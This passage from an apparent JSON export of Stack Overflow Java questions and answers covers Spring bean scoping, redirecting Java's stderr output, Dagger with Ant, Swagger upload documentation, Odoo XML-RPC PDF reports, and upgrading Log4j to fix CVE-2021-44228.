ArrayList&lt;Vokabel&gt;();\n    }\n\n    public void main() throws IOException\n    {\n        System.out.println(&quot;Vokabeln.txt&quot;);\n        this.file = (&quot;Vokabeln.txt&quot;);\n        try (BufferedReader br = new BufferedReader(new FileReader(file)))\n        {\n            line = br.readLine();\n            anzahlVokabeln = Integer.parseInt(line);\n            for(int i = 0;i &lt; anzahlVokabeln; i++)\n            {\n                line = br.readLine();\n                this.Vokabelliste.add(new Vokabel(line.split(&quot;\\\\s+&quot;)[0],line.split(&quot;\\\\s+&quot;)[1]));\n            }\n        }\n        while(status==true)\n        {\n            System.out.println(&quot;Was willst du machen \\n-Vokabel hinzufügen\\n-Vokabel enfernen\\n-Vokabeln Abfragen\\n-Programm Quit&quot;);\n            String line = sc.nextLine();\n            if(line.equals(&quot;one&quot;)||line.equals(&quot;Add vocabulary&quot;))\n            {\n                Vokabelhinzufügen();\n            }\n            else if(line.equals(&quot;two&quot;)||line.equals(&quot;Remove vocabulary&quot;))\n            {\n\n            }\n            else if(line.equals(&quot;three&quot;)||line.equals(&quot;Vokabeln Abfragen&quot;))\n            {\n\n            }\n            else if(line.equals(&quot;four&quot;)||line.equals(&quot;Quit&quot;))\n            {\n                status = false;\n                //Maybe Statistics from the User\n            }\n            else\n            {\n                System.out.println(&quot;This option doesnt exists.&quot;);\n            }\n        }\n    }\n\n    public void Vokabelhinzufügen()\n    {\n        boolean vokabelhinzustatus = true;\n        String Vokabel = &quot;&quot;;\n        while(vokabelhinzustatus==true)\n        {\n            System.out.println(&quot;Please enter the vocabulary now. (Hallo Hello)&quot;);\n            Vokabel = sc.nextLine();\n            try(PrintWriter output = new PrintWriter(new FileWriter(&quot;Vokabeln.txt&quot;,true))) \n            {\n                output.printf(&quot;%s\\r\\n&quot;, Vokabel.toLowerCase());\n                String after = String.valueOf(anzahlVokabeln+1);\n                String before = String.valueOf(anzahlVokabeln);\n//At this point the replace has to be. before is the number before the translation was added and after is after the translation was added.\n            } \n\n            catch (Exception e) {}            \n            System.out.println(&quot;Vocabulary Successfully Added&quot;);\n            System.out.println(&quot;Exit Add Vocabulary?&quot;);\n            String line = sc.nextLine();\n            if(line.equals(&quot;yes&quot;))\n            {\n                break;\n            }\n        }\n    }\n\n    public void Vokabelentfernen()\n    {\n\n    }\n}\n</code></pre>\n"},{"tags":["java","spring","autowired"],"comments":[{"owner":{"account_id":3430916,"reputation":3799,"user_id":3059385,"accept_rate":40,"display_name":"Christopher Schneider"},"score":1,"creation_date":1639586479,"post_id":70366708,"comment_id":124388206,"body_markdown":"Spring components are what you&#39;d call &quot;global&quot; by default. They should generally be stateless singletons. If you need stateful objects (In this case, your state is `projectID`), they should generally not be Spring managed. Just because you&#39;re using Spring doesn&#39;t mean everything should be a Spring managed bean.","body":"Spring components are what you&#39;d call &quot;global&quot; by default. They should generally be stateless singletons. If you need stateful objects (In this case, your state is <code>projectID</code>), they should generally not be Spring managed. Just because you&#39;re using Spring doesn&#39;t mean everything should be a Spring managed bean."},{"owner":{"account_id":22514493,"reputation":35,"user_id":16708926,"display_name":"GC_"},"score":0,"creation_date":1639591853,"post_id":70366708,"comment_id":124390305,"body_markdown":"@ChristopherSchneider I don&#39;t really want it to be managed by spring. However, I want to us autowiring in the JobHelper itself.","body":"@ChristopherSchneider I don&#39;t really want it to be managed by spring. However, I want to us autowiring in the JobHelper itself."},{"owner":{"account_id":3281466,"reputation":2250,"user_id":2761985,"accept_rate":38,"display_name":"Jens Baitinger"},"score":0,"creation_date":1639596541,"post_id":70366708,"comment_id":124391953,"body_markdown":"Probably you need to specify a bit more clearly what you want to do. Do you have one `JobHelper` globally, or do you want multiple ones (one for each `projectId`? If the latter ist the case how should the Springframework find out which of these multiple instances should be autowired?","body":"Probably you need to specify a bit more clearly what you want to do. Do you have one <code>JobHelper</code> globally, or do you want multiple ones (one for each <code>projectId</code>? If the latter ist the case how should the Springframework find out which of these multiple instances should be autowired?"},{"owner":{"account_id":3430916,"reputation":3799,"user_id":3059385,"accept_rate":40,"display_name":"Christopher Schneider"},"score":0,"creation_date":1639599775,"post_id":70366708,"comment_id":124393030,"body_markdown":"Autowiring is used _for_ Spring beans. You can&#39;t autowire something that isn&#39;t a Spring managed bean.","body":"Autowiring is used <i>for</i> Spring beans. You can&#39;t autowire something that isn&#39;t a Spring managed bean."}],"answers":[{"tags":[],"owner":{"account_id":14706862,"reputation":917,"user_id":10621296,"display_name":"Jetto Mart&#237;nez"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639586240,"creation_date":1639586240,"answer_id":70367214,"question_id":70366708,"body_markdown":"For that to work, you need to let Spring now that `JobHelper` is &quot;Autowireable&quot;. It&#39;d be like this for the class where you need `JobHelper` to do things:\r\n\r\n```java\r\npublic class YourClass{\r\n\r\n    @Autowired\r\n    JobHelper jobHelper;    \r\n\r\n    public String jobRun(int projectID){\r\n        jobHelper.this();\r\n        jobHelper.that();\r\n        return &quot;something&quot;;\r\n    }\r\n\r\n}\r\n```\r\nAnd JobHelper itself would be like\r\n\r\n```java\r\n@Component\r\n@Scope(&quot;prototype&quot;)\r\npublic class JobHelper {    \r\n\r\n    public void this(){}\r\n\r\n    public void that(){}\r\n\r\n}\r\n```\r\n\r\nInjection is a broad topic, so I&#39;d suggest you read guides/articles such like this [on @Autowired][1] or this [on @Component][2] from Baeldung for a start.\r\n\r\n\r\n  [1]: https://www.baeldung.com/spring-autowire\r\n  [2]: https://www.baeldung.com/spring-component-annotation","title":"How to create a spring object mid-method?","body":"<p>For that to work, you need to let Spring now that <code>JobHelper</code> is &quot;Autowireable&quot;. It'd be like this for the class where you need <code>JobHelper</code> to do things:</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class YourClass{\n\n    @Autowired\n    JobHelper jobHelper;    \n\n    public String jobRun(int projectID){\n        jobHelper.this();\n        jobHelper.that();\n        return &quot;something&quot;;\n    }\n\n}\n</code></pre>\n<p>And JobHelper itself would be like</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Component\n@Scope(&quot;prototype&quot;)\npublic class JobHelper {    \n\n    public void this(){}\n\n    public void that(){}\n\n}\n</code></pre>\n<p>Injection is a broad topic, so I'd suggest you read guides/articles such like this <a href=\"https://www.baeldung.com/spring-autowire\" rel=\"nofollow noreferrer\">on @Autowired</a> or this <a href=\"https://www.baeldung.com/spring-component-annotation\" rel=\"nofollow noreferrer\">on @Component</a> from Baeldung for a start.</p>\n"}],"owner":{"account_id":22514493,"reputation":35,"user_id":16708926,"display_name":"GC_"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":43,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639586240,"creation_date":1639583923,"question_id":70366708,"body_markdown":"In the old pre spring version I had something like this:\r\n\r\n    public String jobRun(int projectID)\r\n    {\r\n        JobHelper jobHelper = new JobHelper(projectID);\t\r\n    \r\n        jobHelper.this();\r\n        jobHelper.that();\r\n    }\r\n\r\n\t\r\nHow can I create the JobHelper object using spring?  I made it a spring component, but it can&#39;t be global.\r\n\r\nI guess I want something like this:\r\n\r\n    public String jobRun(int projectID)\r\n    {\r\n        @Autowired\r\n        @Scope(&quot;prototype&quot;)\r\n        JobHelper jobHelper;\t\r\n    \r\n        jobHelper.this();\r\n        jobHelper.that();\r\n    }\r\n\r\nHowever, that&#39;s not how spring works.\r\n\r\nThanks,\r\n\t\t\t","title":"How to create a spring object mid-method?","body":"<p>In the old pre spring version I had something like this:</p>\n<pre><code>public String jobRun(int projectID)\n{\n    JobHelper jobHelper = new JobHelper(projectID); \n\n    jobHelper.this();\n    jobHelper.that();\n}\n</code></pre>\n<p>How can I create the JobHelper object using spring?  I made it a spring component, but it can't be global.</p>\n<p>I guess I want something like this:</p>\n<pre><code>public String jobRun(int projectID)\n{\n    @Autowired\n    @Scope(&quot;prototype&quot;)\n    JobHelper jobHelper;    \n\n    jobHelper.this();\n    jobHelper.that();\n}\n</code></pre>\n<p>However, that's not how spring works.</p>\n<p>Thanks,</p>\n"},{"tags":["java","windows","powershell","parsing","command-line"],"answers":[{"tags":[],"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"display_name":"user16320675"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1639585926,"creation_date":1639585926,"answer_id":70367152,"question_id":70366831,"body_markdown":"This command writes to standard error, not to standard output.\r\n\r\nFor command line, try  \r\n`java -XshowSettings:properties -version 2&gt;&amp;1 | findstr /C:java.home`  \r\nThe `2&gt;&amp;1` redirects standard error to standard output.\r\n\r\nOr `java -XshowSettings:properties -version 2&gt; tmp.txt`  \r\nredirecting standard error to file.","title":"How to Parse Java Command Output in Windows Command Line","body":"<p>This command writes to standard error, not to standard output.</p>\n<p>For command line, try<br />\n<code>java -XshowSettings:properties -version 2&gt;&amp;1 | findstr /C:java.home</code><br />\nThe <code>2&gt;&amp;1</code> redirects standard error to standard output.</p>\n<p>Or <code>java -XshowSettings:properties -version 2&gt; tmp.txt</code><br />\nredirecting standard error to file.</p>\n"}],"owner":{"account_id":23656742,"reputation":1,"user_id":17684899,"display_name":"oskguy"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":157,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70367152,"answer_count":1,"score":0,"last_activity_date":1639585926,"creation_date":1639584481,"question_id":70366831,"body_markdown":"My goal is to be able to parse the output of the following windows command line command (and in powershell too) : \r\n```\r\njava -XshowSettings:properties -version\r\n```\r\n\r\nI am trying to specifically get the line that says **&quot;java.home = Path\\to\\java\\home&quot;**\r\n\r\nSo far I have tried commands like \r\n```\r\njava -XshowSettings:properties -version | findstr /C:java.home\r\n```\r\nor redirecting to a file and parsing from there but the file is empty \r\n```\r\n java -XshowSettings:properties -version &gt; tmp.txt\r\n```\r\nI also tried the following powershell commands \r\n```\r\njava -XshowSettings:properties -version | Select-String -Pattern &#39;java.home&#39; -SimpleMatch\r\njava -XshowSettings:properties -version | Out-String -Stream | Select-String -Pattern &#39;home&#39; -SimpleMatch\r\n\r\n```\r\nI even tried making a function for the command and setting a variable to the command output which I would then try to parse, but the variable was also empty\r\n```\r\nfunction javahome {\r\n   java -XshowSettings:properties -version\r\n}\r\n$Jhome = javahome\r\n```\r\n\r\n$Jhome is empty...\r\n\r\nI think that the output of the java command is not outputting through the same pipes that the command lines are capturing even though it is being output on the screen. I&#39;m not sure how to find this separate output and begin parsing it, but that is what I need to do. I need to be able to parse out the java.home path as it is needed for another process. I also will need other lines too, so I am not looking to pull the %JAVA_HOME% environment variable.","title":"How to Parse Java Command Output in Windows Command Line","body":"<p>My goal is to be able to parse the output of the following windows command line command (and in powershell too) :</p>\n<pre><code>java -XshowSettings:properties -version\n</code></pre>\n<p>I am trying to specifically get the line that says <strong>&quot;java.home = Path\\to\\java\\home&quot;</strong></p>\n<p>So far I have tried commands like</p>\n<pre><code>java -XshowSettings:properties -version | findstr /C:java.home\n</code></pre>\n<p>or redirecting to a file and parsing from there but the file is empty</p>\n<pre><code> java -XshowSettings:properties -version &gt; tmp.txt\n</code></pre>\n<p>I also tried the following powershell commands</p>\n<pre><code>java -XshowSettings:properties -version | Select-String -Pattern 'java.home' -SimpleMatch\njava -XshowSettings:properties -version | Out-String -Stream | Select-String -Pattern 'home' -SimpleMatch\n\n</code></pre>\n<p>I even tried making a function for the command and setting a variable to the command output which I would then try to parse, but the variable was also empty</p>\n<pre><code>function javahome {\n   java -XshowSettings:properties -version\n}\n$Jhome = javahome\n</code></pre>\n<p>$Jhome is empty...</p>\n<p>I think that the output of the java command is not outputting through the same pipes that the command lines are capturing even though it is being output on the screen. I'm not sure how to find this separate output and begin parsing it, but that is what I need to do. I need to be able to parse out the java.home path as it is needed for another process. I also will need other lines too, so I am not looking to pull the %JAVA_HOME% environment variable.</p>\n"},{"tags":["java","ant","dagger-2"],"owner":{"account_id":4577850,"reputation":31,"user_id":4161643,"display_name":"Ishan Ganeshan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":62,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639585623,"creation_date":1639585623,"question_id":70367083,"body_markdown":"I am having trouble in setting up Dagger 2 sample cofee app in Eclipse using Ant. We have huge source code built using Ant so we cannot switch to maven. And I can find no sources anywhere which explains how to do that. \r\n\r\nI have created a sample project, included all the dependencies and compiled. But, how do I generate the auto generated code of Dagger and reference it.\r\n\r\nFor example when I do \r\n```\r\nCoffeeShop coffeeShop = DaggerCoffeeApp_CoffeeShop.builder().build();\r\n```\r\n\r\nCompiler in eclipse complains that DaggerCoffeeApp_CoffeeShop cannot be found. \r\n\r\nCan somebody please help with providing me a way to set up Dagger2 with Ant?\r\n\r\nThanks.","title":"Dagger2 Set up in Java with Ant in Eclipse","body":"<p>I am having trouble in setting up Dagger 2 sample cofee app in Eclipse using Ant. We have huge source code built using Ant so we cannot switch to maven. And I can find no sources anywhere which explains how to do that.</p>\n<p>I have created a sample project, included all the dependencies and compiled. But, how do I generate the auto generated code of Dagger and reference it.</p>\n<p>For example when I do</p>\n<pre><code>CoffeeShop coffeeShop = DaggerCoffeeApp_CoffeeShop.builder().build();\n</code></pre>\n<p>Compiler in eclipse complains that DaggerCoffeeApp_CoffeeShop cannot be found.</p>\n<p>Can somebody please help with providing me a way to set up Dagger2 with Ant?</p>\n<p>Thanks.</p>\n"},{"tags":["java","swagger","swagger-ui","openapi","spring-restcontroller"],"comments":[{"owner":{"account_id":1018410,"reputation":3054,"user_id":1029433,"accept_rate":82,"display_name":"kaissun"},"score":0,"creation_date":1640250115,"post_id":70365483,"comment_id":124551723,"body_markdown":"Hello, I am facing also the same issue. Did you find any solution for that ?","body":"Hello, I am facing also the same issue. Did you find any solution for that ?"},{"owner":{"account_id":4091641,"reputation":1488,"user_id":3359469,"accept_rate":50,"display_name":"Falco"},"score":1,"creation_date":1640254584,"post_id":70365483,"comment_id":124553202,"body_markdown":"Hi @kaissun, no, at this moment I agree with frontend team that what I noted down after EDIT in question is enough for them. No better solution, no input file button in swagger-ui...","body":"Hi @kaissun, no, at this moment I agree with frontend team that what I noted down after EDIT in question is enough for them. No better solution, no input file button in swagger-ui..."}],"owner":{"account_id":4091641,"reputation":1488,"user_id":3359469,"accept_rate":50,"display_name":"Falco"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":358,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639585548,"creation_date":1639578766,"question_id":70365483,"body_markdown":"I have spring rest controller with some parameters and HttpServletRequest in input. I use it to stream input file. Simplifying:\r\n\r\n    @PostMapping(path = &quot;...&quot;, consumes = MediaType.MULTIPART_FORM_DATA_VALUE)\r\n    @Operation(summary = &quot;Create document&quot;, description = &quot;upload file for creating a document&quot;)\r\n    \t@ApiResponse(content = @Content(mediaType = MediaType.TEXT_PLAIN_VALUE, schema = @Schema(implementation = MyDTO.class)))\r\n    \t@ApiResponses(value = { @ApiResponse(responseCode = &quot;200&quot;, description = &quot;Data found&quot;),\r\n    \t@ApiResponse(responseCode = &quot;400&quot;, description = &quot;Request not compliant with the defined schema&quot;)\r\n    ...\r\n\tpublic ResponseEntity&lt;MyDTO&gt; myUpl(\r\n\t\t\t@PathVariable(&quot;myParam1&quot;) Long param1,\r\n\t\t\t@RequestParam(name = &quot;myParam2&quot;, required = true) Integer myParam2,\r\n\t\t\tHttpServletRequest request ) {\r\n\r\nSo when I invoke swagger-ui and produce swagger yaml there is no file input.\r\n\r\nThe code works perfectly.\r\n\r\nI need to clarify in swagger the input file for frontend team.\r\n\r\nHow can I do that?\r\n\r\nEDIT:\r\n\r\nFollowing other posts, temporanely added to controller:\r\n\r\n    \r\n\t@RequestBody(description = &quot;Input file&quot;,\r\n\t\tcontent = @Content(mediaType = MediaType.MULTIPART_FORM_DATA_VALUE, \r\n\t        schema = @Schema(implementation = MultipartRequest.class),\r\n\t\t\tencoding = @Encoding(name = &quot;file&quot;, contentType = &quot;application/pdf&quot;)))\r\n\r\nAt least I have in swagger yaml:\r\n\r\n          requestBody:\r\n        description: Input file\r\n        content:\r\n          multipart/form-data:\r\n            schema:\r\n              $ref: &#39;#/components/schemas/MultipartRequest&#39;\r\n            encoding:\r\n              file:\r\n                contentType: application/pdf\r\n\r\nand un swagger-ui:\r\n\r\n    Request body     multipart/form-data\r\n      Input file\r\n    fileMap\r\n      object\r\n    fileNames\r\n      object\r\n    multiFileMap\r\n      object\r\n\r\nIt&#39;s the right way? There&#39;s something better? Is it possible to show Input File button in swagger-ui?\r\n\r\n","title":"Spring Rest Controller with HttpServletRequest for upload resulting in no input file upload in Swagger","body":"<p>I have spring rest controller with some parameters and HttpServletRequest in input. I use it to stream input file. Simplifying:</p>\n<pre><code>@PostMapping(path = &quot;...&quot;, consumes = MediaType.MULTIPART_FORM_DATA_VALUE)\n@Operation(summary = &quot;Create document&quot;, description = &quot;upload file for creating a document&quot;)\n    @ApiResponse(content = @Content(mediaType = MediaType.TEXT_PLAIN_VALUE, schema = @Schema(implementation = MyDTO.class)))\n    @ApiResponses(value = { @ApiResponse(responseCode = &quot;200&quot;, description = &quot;Data found&quot;),\n    @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Request not compliant with the defined schema&quot;)\n...\npublic ResponseEntity&lt;MyDTO&gt; myUpl(\n        @PathVariable(&quot;myParam1&quot;) Long param1,\n        @RequestParam(name = &quot;myParam2&quot;, required = true) Integer myParam2,\n        HttpServletRequest request ) {\n</code></pre>\n<p>So when I invoke swagger-ui and produce swagger yaml there is no file input.</p>\n<p>The code works perfectly.</p>\n<p>I need to clarify in swagger the input file for frontend team.</p>\n<p>How can I do that?</p>\n<p>EDIT:</p>\n<p>Following other posts, temporanely added to controller:</p>\n<pre><code>@RequestBody(description = &quot;Input file&quot;,\n    content = @Content(mediaType = MediaType.MULTIPART_FORM_DATA_VALUE, \n        schema = @Schema(implementation = MultipartRequest.class),\n        encoding = @Encoding(name = &quot;file&quot;, contentType = &quot;application/pdf&quot;)))\n</code></pre>\n<p>At least I have in swagger yaml:</p>\n<pre><code>      requestBody:\n    description: Input file\n    content:\n      multipart/form-data:\n        schema:\n          $ref: '#/components/schemas/MultipartRequest'\n        encoding:\n          file:\n            contentType: application/pdf\n</code></pre>\n<p>and un swagger-ui:</p>\n<pre><code>Request body     multipart/form-data\n  Input file\nfileMap\n  object\nfileNames\n  object\nmultiFileMap\n  object\n</code></pre>\n<p>It's the right way? There's something better? Is it possible to show Input File button in swagger-ui?</p>\n"},{"tags":["java","report","odoo","encode","xml-rpc"],"owner":{"account_id":10834648,"reputation":11,"user_id":7967986,"display_name":"Diego Rodriguez"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":698,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639585544,"creation_date":1639580267,"question_id":70365833,"body_markdown":"I&#39;ve been hitting my head against a wall since a week ago. I am working with Odoo 13 and with the external API that it offers for java using XMLRPC client, as they teach in their [documentation.][1] \r\n\r\n\r\nMy goal is to obtain a report PDF for an invoice. Researching in the documentation and in other forums, I have found that I have to use the **&quot;render_qweb_pdf&quot;** function of the **ir.actions.report** model. This function returns me what the PDF data would be once obtained, and then I would parse them with this data and obtain the PDF, or I could also create an attachment and access it.\r\n\r\nThis is an [example][2] of my goal in python and the code \r\n\r\n\r\n```\r\npdf = self.env.ref(&#39;account.account_invoices&#39;).sudo().render_qweb_pdf([self.id])[0]\r\nself.env[&#39;ir.attachment&#39;].create({\r\n    &#39;name&#39;: self.number + &quot;.pdf&quot;,\r\n    &#39;type&#39;: &#39;binary&#39;,\r\n    &#39;res_id&#39;: self.id,\r\n    &#39;res_model&#39;: &#39;account.invoice&#39;,\r\n    &#39;datas&#39;: base64.b64encode(pdf),\r\n    &#39;mimetype&#39;: &#39;application/x-pdf&#39;,\r\n    &#39;datas_fname&#39;: self.number + &quot;.pdf&quot;\r\n})\r\n```\r\nMy first problem comes when I execute that function in java, following the models that I need and the data to pass the function, which is the following:\r\n```\r\nmodels.execute(&quot;execute_kw&quot;, Arrays.asList(\r\n                db, uid, password,\r\n                &quot;ir.actions.report&quot;, &quot;render_qweb_pdf&quot;,\r\n                Arrays.asList(id, res_ids)\r\n            ));\r\n\r\nInteger idAttach = (Integer)models.execute(&quot;execute_kw&quot;, Arrays.asList(\r\n                   db, uid, password, &quot;ir.attachment&quot;, &quot;create&quot;,\r\n                    Arrays.asList(new HashMap() {{\r\n                            put(&quot;name&quot;, saved_invoice.get(&quot;display_name&quot;));\r\n                            put(&quot;type&quot;, &quot;binary&quot;);\r\n                            put(&quot;datas&quot;, &quot;/*Response of the function render_qweb_pdf*/&quot;);\r\n                            put(&quot;store_fname&quot;, saved_invoice.get(&quot;display_name&quot;));\r\n                            put(&quot;res_model&quot;, &quot;account.move&quot;);\r\n                            put(&quot;res_id&quot;, saved_invoice.get(&quot;id&quot;));\r\n                            put(&quot;mimetype&quot;, &quot;application/x-pdf&quot;);\r\n                    }})\r\n        ));\r\n```\r\nAnd the response of &quot;render_qweb_pdf&quot; is :\r\n\r\n`Failed to parse server&#39;s response: An invalid XML character (Unicode: 0x10) was found in the element content of the document`\r\n\r\n\r\nI don&#39;t know why it is because it is more a problem with the Odoo Server or XMLRPClient in java that does not accept the encoding of the response.\r\n```\r\n        final XmlRpcClient models = new XmlRpcClient() {{\r\n            setConfig(new XmlRpcClientConfigImpl() {{\r\n                setServerURL(new URL(String.format(&quot;%sxmlrpc/2/object&quot;, url)));\r\n                setBasicEncoding(Charsets.UTF_8.name());\r\n                setEncoding(Charsets.UTF_8.name());\r\n                setEnabledForExceptions(true);\r\n                setEnabledForExtensions(true);\r\n            }});\r\n        }};\r\n```\r\nI have tried to change the encoding when creating the client and there has been no way to solve it. It&#39;s possible that I am doing something wrong when making the request, but I no longer know what to do.\r\nI have also tried to make the request directly against the server, but I need a token that the user does not provide me.\r\n\r\nCould someone tell me what to do? Greetings and thank you.\r\n\r\n\r\n  [1]: https://www.odoo.com/documentation/13.0/developer/misc/api/odoo.html\r\n  [2]: https://www.odoo.com/es_ES/forum/ayuda-1/creating-attachments-for-account-invoice-in-odoo-12-159100","title":"Download report PDF ODO 13 API External","body":"<p>I've been hitting my head against a wall since a week ago. I am working with Odoo 13 and with the external API that it offers for java using XMLRPC client, as they teach in their <a href=\"https://www.odoo.com/documentation/13.0/developer/misc/api/odoo.html\" rel=\"nofollow noreferrer\">documentation.</a></p>\n<p>My goal is to obtain a report PDF for an invoice. Researching in the documentation and in other forums, I have found that I have to use the <strong>&quot;render_qweb_pdf&quot;</strong> function of the <strong>ir.actions.report</strong> model. This function returns me what the PDF data would be once obtained, and then I would parse them with this data and obtain the PDF, or I could also create an attachment and access it.</p>\n<p>This is an <a href=\"https://www.odoo.com/es_ES/forum/ayuda-1/creating-attachments-for-account-invoice-in-odoo-12-159100\" rel=\"nofollow noreferrer\">example</a> of my goal in python and the code</p>\n<pre><code>pdf = self.env.ref('account.account_invoices').sudo().render_qweb_pdf([self.id])[0]\nself.env['ir.attachment'].create({\n    'name': self.number + &quot;.pdf&quot;,\n    'type': 'binary',\n    'res_id': self.id,\n    'res_model': 'account.invoice',\n    'datas': base64.b64encode(pdf),\n    'mimetype': 'application/x-pdf',\n    'datas_fname': self.number + &quot;.pdf&quot;\n})\n</code></pre>\n<p>My first problem comes when I execute that function in java, following the models that I need and the data to pass the function, which is the following:</p>\n<pre><code>models.execute(&quot;execute_kw&quot;, Arrays.asList(\n                db, uid, password,\n                &quot;ir.actions.report&quot;, &quot;render_qweb_pdf&quot;,\n                Arrays.asList(id, res_ids)\n            ));\n\nInteger idAttach = (Integer)models.execute(&quot;execute_kw&quot;, Arrays.asList(\n                   db, uid, password, &quot;ir.attachment&quot;, &quot;create&quot;,\n                    Arrays.asList(new HashMap() {{\n                            put(&quot;name&quot;, saved_invoice.get(&quot;display_name&quot;));\n                            put(&quot;type&quot;, &quot;binary&quot;);\n                            put(&quot;datas&quot;, &quot;/*Response of the function render_qweb_pdf*/&quot;);\n                            put(&quot;store_fname&quot;, saved_invoice.get(&quot;display_name&quot;));\n                            put(&quot;res_model&quot;, &quot;account.move&quot;);\n                            put(&quot;res_id&quot;, saved_invoice.get(&quot;id&quot;));\n                            put(&quot;mimetype&quot;, &quot;application/x-pdf&quot;);\n                    }})\n        ));\n</code></pre>\n<p>And the response of &quot;render_qweb_pdf&quot; is :</p>\n<p><code>Failed to parse server's response: An invalid XML character (Unicode: 0x10) was found in the element content of the document</code></p>\n<p>I don't know why it is because it is more a problem with the Odoo Server or XMLRPClient in java that does not accept the encoding of the response.</p>\n<pre><code>        final XmlRpcClient models = new XmlRpcClient() {{\n            setConfig(new XmlRpcClientConfigImpl() {{\n                setServerURL(new URL(String.format(&quot;%sxmlrpc/2/object&quot;, url)));\n                setBasicEncoding(Charsets.UTF_8.name());\n                setEncoding(Charsets.UTF_8.name());\n                setEnabledForExceptions(true);\n                setEnabledForExtensions(true);\n            }});\n        }};\n</code></pre>\n<p>I have tried to change the encoding when creating the client and there has been no way to solve it. It's possible that I am doing something wrong when making the request, but I no longer know what to do.\nI have also tried to make the request directly against the server, but I need a token that the user does not provide me.</p>\n<p>Could someone tell me what to do? Greetings and thank you.</p>\n"},{"tags":["java","logging","slf4j"],"answers":[{"tags":[],"owner":{"account_id":22488238,"reputation":165,"user_id":16686308,"display_name":"Luna"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639585321,"creation_date":1639585321,"answer_id":70367020,"question_id":70366894,"body_markdown":"Short answer: no.\r\n\r\nLong answer: Whole different packages, java.util doesnt use log4j at all.","title":"Logs with java.util.logger are affected by CVE-2021-44228?","body":"<p>Short answer: no.</p>\n<p>Long answer: Whole different packages, java.util doesnt use log4j at all.</p>\n"}],"owner":{"account_id":13266324,"reputation":169,"user_id":12893352,"display_name":"Illidan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":432,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"answer_count":1,"score":-2,"last_activity_date":1639585321,"creation_date":1639584765,"question_id":70366894,"body_markdown":"I&#39;m migrating all the slf4j dependencies affected by the vulnerability and I&#39;m wondering if in the projects that the log is by java.util.logger (some of these projects are used as dependencies of others) affects some kind below. In theory no, no ? ","title":"Logs with java.util.logger are affected by CVE-2021-44228?","body":"<p>I'm migrating all the slf4j dependencies affected by the vulnerability and I'm wondering if in the projects that the log is by java.util.logger (some of these projects are used as dependencies of others) affects some kind below. In theory no, no ?</p>\n"},{"tags":["java","spring-boot"],"comments":[{"owner":{"account_id":124616,"reputation":3792,"user_id":1331935,"display_name":"Jeff"},"score":0,"creation_date":1639584988,"post_id":70360237,"comment_id":124387620,"body_markdown":"Yes 2.15.0 is still an issue, need to push to 2.16.0","body":"Yes 2.15.0 is still an issue, need to push to 2.16.0"}],"answers":[{"tags":[],"owner":{"account_id":14364448,"reputation":41,"user_id":11227896,"display_name":"Pratik Dutta"},"down_vote_count":2,"up_vote_count":1,"is_accepted":false,"score":-1,"last_activity_date":1639584945,"creation_date":1639555594,"answer_id":70360238,"question_id":70360237,"body_markdown":"To fix this vulnerability we need to upgrade 2.x version of log4j to at least 2.16.0 or later.\r\n\r\nSteps: \r\n1. Go to pom.xml of spring boot project\r\n2. Go to `&lt;properties&gt;&lt;/properties&gt;` section\r\n3. Add `&lt;log4j2.version&gt;2.16.0&lt;/log4j2.version&gt;`","title":"Log4J vulnerability | CVE 2021-44228 in Spring Boot Fix-Bugs in Log4j 2.15.0","body":"<p>To fix this vulnerability we need to upgrade 2.x version of log4j to at least 2.16.0 or later.</p>\n<p>Steps:</p>\n<ol>\n<li>Go to pom.xml of spring boot project</li>\n<li>Go to <code>&lt;properties&gt;&lt;/properties&gt;</code> section</li>\n<li>Add <code>&lt;log4j2.version&gt;2.16.0&lt;/log4j2.version&gt;</code></li>\n</ol>\n"}],"owner":{"account_id":14364448,"reputation":41,"user_id":11227896,"display_name":"Pratik Dutta"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":4912,"favorite_count":0,"down_vote_count":3,"up_vote_count":0,"closed_date":1639556389,"answer_count":1,"score":-3,"last_activity_date":1639584945,"creation_date":1639555594,"question_id":70360237,"body_markdown":"How to fix Log4J vulnerability | CVE 2021-44228 in Spring Boot ? Is there any bug in Log4j 2.15.0 version? ","title":"Log4J vulnerability | CVE 2021-44228 in Spring Boot Fix-Bugs in Log4j 2.15.0","body":"<p>How to fix Log4J vulnerability | CVE 2021-44228 in Spring Boot ? Is there any bug in Log4j 2.15.0 version?</p>\n"},{"tags":["java","static","heap-memory"],"answers":[{"tags":[],"owner":{"account_id":447475,"reputation":1,"user_id":841108,"accept_rate":61,"display_name":"Basile Starynkevitch"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1423057144,"creation_date":1423056802,"answer_id":28322743,"question_id":28322574,"body_markdown":"Read much more about the [JVM][1], its bytecode, and its [class loaders][2].\r\n\r\nYou could download and read the [JVM specification][3].\r\n\r\nIn practice, JVMs are using [JIT compilation][4] techniques on the bytecode.\r\n\r\nIn principle, JVMs load  classes (e.g. in `.class` files)  containing bytecode (and other data).\r\n\r\nA Java class is represented by some structure containing something similar to a [vtable][5] which (in theory) associate function bytecode to method 